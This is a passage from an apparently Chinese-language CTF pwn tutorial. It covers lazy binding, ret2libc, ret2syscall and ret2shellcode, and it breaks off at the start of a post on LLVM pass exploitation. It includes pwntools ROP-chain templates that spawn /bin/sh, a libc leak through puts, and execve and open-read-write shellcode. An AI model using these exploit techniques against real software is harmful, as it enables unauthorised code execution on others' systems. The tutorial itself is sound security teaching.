./2.38/libc.so.6 ./pwn<span class="token comment">#更改libc</span><span class="token variable">$patchelf</span> --set-interpreter ./2.35/ld-linux-x86-64.so.2 ./pwn<span class="token comment">#更改ld</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="onegadget"><a href="#onegadget" class="headerlink" title="onegadget"></a>onegadget</h5><p>能直接<code>getshell</code>的<code>gadget</code>，<u>添加参数<code>-l2</code>可以获得更多</u></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$one_gadget</span> ./libc.so.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h4><p>参考文章：<a href="https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/">https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/</a></p><p>延迟绑定是一种在程序运行时才解析<strong>外部符号</strong>（如函数和变量）地址的技术，它允许程序在启动时不必立即加载所有动态链接库中的符号，从而提高程序的启动速度</p><p><code>c</code>语言内置的函数(例如<code>printf</code>）都是依赖于<code>libc</code>中的外部函数</p><h5 id="动态链接与静态链接"><a href="#动态链接与静态链接" class="headerlink" title="动态链接与静态链接"></a>动态链接与静态链接</h5><p><strong>动态链接</strong>是指在程序运行时才将程序与所需的动态链接库中的库函数链接起来的过程，动态链接的程序在启动时会加载所需的动态库（例如<code>libc</code>），并在运行时解析外部符号的地址</p><p><strong>静态链接</strong>在编译时将所有需要的库函数直接复制到可执行文件中，生成的可执行文件不依赖于外部的库文件，可以独立运行，但是会导致可执行文件体积增大</p><h5 id="plt与got"><a href="#plt与got" class="headerlink" title="plt与got"></a>plt与got</h5><p><strong>PLT（Procedure Linkage Table）</strong> 是一个代码段，包含了用于动态链接的跳转指令。每个需要动态链接的外部函数都会在<code>PLT</code>中有一个条目，当程序第一次调用这个函数时，<code>PLT</code>中的代码会被执行，这个代码会去查找并解析外部函数的实际地址，并将其存储在<code>GOT</code>中，以便后续调用时直接跳转到正确的地址</p><p><strong>GOT（Global Offset Table）</strong> 是一个数据段，存储了所有外部符号的地址。在程序启动时，<code>GOT</code>中的条目可能并不包含最终的地址，而是包含指向<code>PLT</code>中相应条目的指针。当<code>PLT</code>条目第一次被执行时，会将查找到的外部符号地址更新到<code>GOT</code>中，这样后续的调用就可以直接通过<code>GOT</code>找到正确的地址</p><h5 id="延迟绑定过程"><a href="#延迟绑定过程" class="headerlink" title="延迟绑定过程"></a>延迟绑定过程</h5><ol><li><strong>程序启动</strong>：程序启动时，动态链接器加载程序和所有依赖的动态库</li><li><strong>符号解析</strong>：当程序第一次调用一个外部函数时，<code>PLT</code>中的代码会被执行，查找并解析外部函数的实际地址</li><li><strong>地址存储</strong>：查找到的地址被存储在<code>GOT</code>中，以便后续调用</li><li><strong>直接调用</strong>：后续对同一外部函数的调用将直接通过<code>GOT</code>进行，无需再次解析</li></ol><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul><li>执行函数的<code>plt</code>会通过跳转<code>got</code>直接调用到该函数</li><li><code>got</code>表可写的情况下覆盖函数的<code>got</code>表为其他函数地址可以实现调用该函数时执行到其他函数</li></ul><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>目标是执行<code>system(&quot;/bin/sh&quot;);</code>，即执行<code>system</code>函数其一参为<code>&quot;/bin/sh&quot;</code></p><h4 id="有system和-x2F-bin-x2F-sh"><a href="#有system和-x2F-bin-x2F-sh" class="headerlink" title="有system和&#x2F;bin&#x2F;sh"></a>有system和&#x2F;bin&#x2F;sh</h4><p>延迟绑定部分提到，执行函数的<code>plt</code>可以直接调用到该函数，那么构造<code>rop</code>链就是要先控制一参<code>rdi</code>为<code>&quot;/bin/sh&quot;</code>的地址再填<code>system</code>的<code>plt</code></p><ul><li><p>控制一参</p><p>使用<code>ROPgadget</code>找到<code>pop rdi</code>的地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--only</span> <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'rdi'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ps：<code>gadget</code>中含有<code>pop rdi</code>就行，但是有<code>pop</code>其他寄存器就需要在后面加上对应的值，例如<code>0x000ac112 : pop rdi ; pop rbx ; ret</code>，<code>pop rdi</code>之后还<code>pop rbx</code>，所以后面需要加两个地址，即<code>p64(0x000ac112) + p64(rdi_content) + p64(rbx_content)</code>，后面就可以继续加其他<code>gadget</code></p></li><li><p>找<code>&quot;/bin/sh&quot;</code>地址</p><p><code>&quot;/bin/sh&quot;</code>地址需要在<code>IDA</code>中查找，直接按<code>f12</code>找到对应地址</p></li><li><p>找<code>system</code>函数地址</p><p><code>pwntools</code>中可以直接获取<code>plt</code>和<code>got</code>的地址：<code>elf.plt[&#39;system&#39;]</code><code>elf.got[&#39;system&#39;]</code></p></li></ul><p>最终构造出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi' -> pop_rdi_ret</span>pop_rdi_ret <span class="token operator">=</span> bin_sh <span class="token operator">=</span> IDA中<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>sh地址system_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ? <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="有system无-x2F-bin-x2F-sh"><a href="#有system无-x2F-bin-x2F-sh" class="headerlink" title="有system无&#x2F;bin&#x2F;sh"></a>有system无&#x2F;bin&#x2F;sh</h4><p>缺少<code>/bin/sh</code>可以直接往程序中的一个地址写入<code>/bin/sh</code>，假设地址是<code>buf</code>，那么就要先构造<code>gets(buf)</code>，读取<code>/bin/sh</code>之后再执行<code>system(&#39;/bin/sh&#39;)</code>，其中<code>system</code>的一参就说<code>buf</code>，即<code>/bin/sh</code>的地址</p><ul><li>获取<code>gets</code>的<code>plt</code>地址：<code>elf.plt[&#39;gets&#39;]</code></li><li>设置<code>buf</code>的地址，从<code>IDA</code>中选取，可以从<code>bss</code>段中选取地址</li><li>获取<code>system</code>的<code>plt</code>地址：<code>elf.plt[&#39;system&#39;]</code></li><li>设置一参：<code>ROPgadget --binary ./pwn --only &#39;pop|ret&#39; | grep &#39;rdi&#39;</code></li></ul><p>最终构造：注意发送<code>/bin/sh</code>最后加上<code>\x00</code>截断字符串，在执行<code>rop</code>链的过程中会执行<code>gets(buf)</code>从输入流输入<code>buf</code>的值，此时输入<code>/bin/sh\x00</code>即可向<code>buf</code>输入字符串</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi' -> pop_rdi_ret</span>pop_rdi_ret <span class="token operator">=</span> buf <span class="token operator">=</span> gets_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span>system_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ?p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gets_plt<span class="token punctuation">)</span><span class="token comment">#gets(buf)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token comment">#system(buf)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="无system无-x2F-bin-x2F-sh"><a href="#无system无-x2F-bin-x2F-sh" class="headerlink" title="无system无&#x2F;bin&#x2F;sh"></a>无system无&#x2F;bin&#x2F;sh</h4><p>可执行文件中没有<code>system</code>，但是作为动态链接库的<code>libc</code>中有，所以直接执行<code>libc</code>中的<code>system</code>即可，所以思路就是先获取<code>libc</code>的基址，再计算<code>libc</code>中<code>system</code>和<code>/bin/sh</code>的地址，最后执行<code>system(&#39;/bin/sh&#39;)</code></p><p><code>got</code>部分提到<code>got</code>表存放了外部符号地址，即<code>libc</code>中的地址，所以如果能够泄露<code>got</code>表中的地址就能获取<code>libc</code>中某个函数的真实地址，再减去这个函数在<code>libc</code>中的偏移就能得到<code>libc</code>的基址，最后加上<code>system</code>函数的偏移就能得到<code>system</code>函数的地址</p><ul><li><p>泄露<code>got</code>表中函数的地址</p><p>需要用一个输出函数输出一个<code>got</code>表的地址，一般构造<code>puts(puts_got)</code>，最后还要再回到该函数继续利用栈溢出，即<code>p64(pop_rdi_ret) + p64(puts_got) + p64(puts) + p64(main)</code></p><p>接收该地址：基本就是一个固定用法<code>u64(r.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))</code></p></li><li><p>获取<code>libc</code>基址</p><p>标志：64位以<code>7f</code>开头，基址末尾三位是0</p><p>已知<code>puts</code>函数的真实地址和<code>puts</code>函数的偏移，<code>libc</code>的基址就等于真实地址减偏移</p><p>获取<code>puts</code>函数在<code>libc</code>中的偏移可以通过<code>libc = ELF(&#39;libc文件&#39;)</code>，然后<code>libc.sym[&#39;puts&#39;]</code>得到<code>puts</code>偏移</p><p>在打本地的时候如果修改了<code>libc</code>版本需要对应修改<code>ELF</code>里的文件路径，也可以直接在本地打通之后修改文件路径为远程的<code>libc</code>文件后直接打远程</p></li><li><p>获取<code>system</code>和<code>/bin/sh</code>地址：从<code>libc</code>获取地址需要<strong>加上基址</strong></p><p><code>system = libc.sym[&#39;system&#39;] + libc_base</code></p><p><code>bin_sh = libc.search(b&#39;/bin/sh\x00&#39;).__next__() + libc_base</code></p></li></ul><p>最终构造：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi' -> pop_rdi_ret</span>pop_rdi_ret <span class="token operator">=</span> main <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ? <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc文件路径'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basebin_sh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ? <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h4><p>某些指令，如<code>movaps</code>（用于操作<code>XMM</code>寄存器），要求栈指针<code>RSP</code>必须是<code>16</code>字节对齐的，直接从返回地址开始写<code>rop</code>链可能会造成堆栈不平衡，需要在<code>rop</code>链前加上汇编指令<code>ret</code>平衡堆栈</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--only</span> <span class="token string">'ret'</span><span class="token comment">#查找ret指令的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="32位程序"><a href="#32位程序" class="headerlink" title="32位程序"></a>32位程序</h4><p>32位和64位的区别就是32位通过栈传参而不通过寄存器传参，所以不像64位需要找<code>pop rdi</code>的值，32位构造<code>rop</code>链的方式是函数+返回地址+参数列表，例如</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ?p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gets<span class="token punctuation">)</span><span class="token comment">#gets(buf)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token comment">#system(buf)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>对应32位的程序</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x64</span> <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gets_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p><a href="https://starrysky1004.github.io/ret2libc.zip">https://starrysky1004.github.io/ret2libc.zip</a></p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>在题目没有给<code>libc</code>的情况下可以通过泄露多个已知函数名的地址，在<a href="https://libc.rip/%E4%B8%AD%E6%9F%A5%E8%AF%A2">https://libc.rip/中查询</a></p><h2 id="4-ret2syscall-amp-ret2shellcode-amp-零碎知识点"><a href="#4-ret2syscall-amp-ret2shellcode-amp-零碎知识点" class="headerlink" title="4.ret2syscall&amp;ret2shellcode&amp;零碎知识点"></a>4.ret2syscall&amp;ret2shellcode&amp;零碎知识点</h2><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><h4 id="前置基础-2"><a href="#前置基础-2" class="headerlink" title="前置基础"></a>前置基础</h4><p>操作系统的进程空间分为用户空间和内核空间，内核空间需要更高的权限，系统调用就是运行在用户空间的程序向操作系统内核请求需要更高权限运行的<strong>内核函数</strong></p><p>当用户态进程发起一个系统调用，<code>CPU</code>切换到内核态并开始执行一个内核函数。由于系统调用处理函数只有一个，所以需要通过<code>rax</code>传递系统调用号确定调用的函数</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>应用程序在用户态准备好调用参数（包括系统调用号和函数参数），在<code>64</code>位程序中执行<code>syscall</code>或在<code>32</code>位程序中执行<code>int 80</code>触发软中断，<code>CPU</code>被软中断打断后执行对应中断处理函数，最后执行<code>ret</code>指令切换回用户态</p><p>常用系统调用号：</p><p><code>32</code>位  <code>read 3  open 5write 4  sigreturn 77/0x4Dexecve 11/0xb</code></p><p><code>64</code>位  <code>read 0      open 2write 1  sigreturn 15/0xF   execve 59/0x3b</code></p><p><code>execve</code>用法：<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对比<code>ret2libc</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>xxx_plt<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>全部系统调用号参考：<a href="https://syscalls.mebeim.net/?table=x86/64/x64/latest">https://syscalls.mebeim.net/?table=x86/64/x64/latest</a></p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><h4 id="前置基础-3"><a href="#前置基础-3" class="headerlink" title="前置基础"></a>前置基础</h4><p>控制程序执行<code>shellcode</code>代码，<code>shellcode</code>指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的<code>shell</code>，或者<code>open read write</code>获取并输出<code>flag</code>，通常情况下<code>shellcode</code>需要我们自行编写，即向内存中填充一些可执行的代码</p><p>前提条件：<code>shellcode</code>所在的区域具有可执行权限</p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>查看禁用的函数<code>seccomp-tools dump ./pwn</code></p><p><code>exp</code>中<code>pwntools</code>使用：</p><ul><li><p>使用<code>asm()</code>将汇编代码转换为对应的机器码</p></li><li><p>生成<code>shell</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>生成<code>orw</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x123000</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment">#'rsp'</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x123000</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>自己写<code>shellcode</code></p><ul><li><p>执行<code>execve(&#39;/bin/sh&#39;, 0, 0)</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">shellcode &#x3D; &#39;&#39;&#39;xor rdx,rdxpush rdxmov rsi,rspmov rax,0x68732f2f6e69622fpush raxmov rdi,rspmov rax,59syscall&#39;&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>执行<code>open read write</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">shellcode &#x3D; &quot;&quot;&quot;push 0x67616c66mov rdi,rspxor esi,esipush 2pop raxsyscallmov rdi,raxmov rsi,rspmov edx,0x100xor eax,eaxsyscallmov edi,1mov rsi,rsppush 1pop raxsyscall&quot;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p>在线汇编和反汇编：<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/">http://shell-storm.org/online/Online-Assembler-and-Disassembler/</a></p><h4 id="常见情况"><a href="#常见情况" class="headerlink" title="常见情况"></a>常见情况</h4><ul><li>没有开启<code>NX</code>保护，可以泄露栈地址向栈中写入<code>shellcode</code>再将返回地址改到该地址</li><li>程序使用<code>mprotect</code>函数给某一段可读可写可执行权限，并且让用户向这一段的变量中输入，再直接将输入的变量作为函数调用</li></ul><h3 id="零碎知识点"><a href="#零碎知识点" class="headerlink" title="零碎知识点"></a>零碎知识点</h3><p>整数溢出：变量定义为整型但输入后<code>(unsigned int)</code>强制转化为无符号整型，输入<code>-1</code>则变成正无穷</p><p>字符溢出：<code>char</code>类型范围是<code>-128~+127</code>，因此输入超过<code>128</code>会变成负数</p><p>数组越界：<code>index</code>可控的时候越界写到其他变量</p><p><code>str</code>类函数：例如<code>strcpy</code>、<code>strcat</code>、<code>strcmp</code>、<code>strlen</code>等函数会被<code>\x00</code>截断</p><p><code>scanf</code>：输入<code>+</code>或<code>-</code>不会有实际输入</p><p>随机数绕过：利用<code>c</code>和<code>python</code>联合编程，例如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'./2.35/libc.so.6'</span><span class="token punctuation">)</span>seed <span class="token operator">=</span> <span class="token number">0</span>libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v6 <span class="token operator">=</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'input: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-pwn环境配置&quot;&gt;&lt;a href=&quot;#1-pwn环境配置&quot; class=&quot;headerlink&quot; title=&quot;1.pwn环境配置&quot;&gt;&lt;/a&gt;1.pwn环境配置&lt;/h2&gt;&lt;p&gt;视频讲解：&lt;a href=&quot;https://www.bilibili.com/vid</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="教程" scheme="https://starrysky1004.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>LLVM PASS PWN：使用c++编写exp</title>
    <link href="https://starrysky1004.github.io/2024/10/31/llvm-pass-shi-yong-c-bian-xie-exp/llvm-pass-shi-yong-c-bian-xie-exp/"/>
    <id>https://starrysky1004.github.io/2024/10/31/llvm-pass-shi-yong-c-bian-xie-exp/llvm-pass-shi-yong-c-bian-xie-exp/</id>
    <published>2024-10-31T03:27:53.000Z</published>
    <updated>2024-10-31T03:31:53.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近比赛中遇到一道<code>llvm pass pwn</code>，现学了一下相关知识，发现网上的讲解和例题的<code>exp</code>基本都是用的<code>c</code>语言，而比赛中的这题在题目描述中说明了用的是<code>c++</code>，虽然用<code>c</code>也可以通过修改<code>.ll</code>文件完成，但是相比之下还是觉得直接用<code>c++</code>写<code>exp</code>方便一些，主要体现在：</p><ul><li><code>c</code>语言需要导入<code>#include &lt;stdbool.h&gt;</code>头才能使用<code>bool</code>类型</li><li><code>c</code>语言没有<code>class</code>，需要先写成<code>struct</code>再修改<code>.ll</code>文件中的<code>struct</code>为<code>class</code>，且使用<code>struct</code>编写本身也比<code>class</code>麻烦</li></ul><h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><h3 id="llvm"><a href="#llvm" class="headerlink" title="llvm"></a>llvm</h3><p><code>llvm</code>的作用：<code>gcc</code>编译时前后端耦合在一起，出现新平台或编译程序都需要重新设计<code>IR</code>，而<code>llvm</code>使用统一的中间代码不需要设计新的<code>IR</code></p><p><code>llvm pass</code>：对<code>ir</code>进行分析 优化等操作的过程的模块</p><p><code>IR</code>的三种表现形式:</p><ul><li><code>.ll</code>：可读<code>IR</code>，类似汇编</li><li><code>.bc</code>：不可读二进制<code>IR</code></li><li>保存在内存中</li></ul><p><code>llvm</code>工具</p><ul><li><code>llvm-as</code>：把<code>LLVM IR</code>从人可读的文本格式汇编成成二进制格式</li><li><code>llvm-dis</code>：<code>llvm-as</code>的逆过程，即反汇编</li><li><code>opt</code>：优化<code>LLVM IR</code>，输出新的<code>LLVM IR</code></li><li><code>llc</code>：把<code>LLVM IR</code>编译成汇编码</li><li><code>lli</code>：解释执行<code>LLVM IR</code></li></ul><p>环境配置:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> clang-12 clang-8 llvm-12 llvm-8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>程序编译:</p><ul><li><p>编译为<code>.ll</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">clang-12 -emit-llvm <span class="token parameter variable">-S</span> exp.c <span class="token parameter variable">-o</span> exp.ll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>编译为<code>.bc</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">clang-12 -emit-llvm <span class="token parameter variable">-c</span> exp.c <span class="token parameter variable">-o</span> exp.bc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>程序运行:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">opt-12 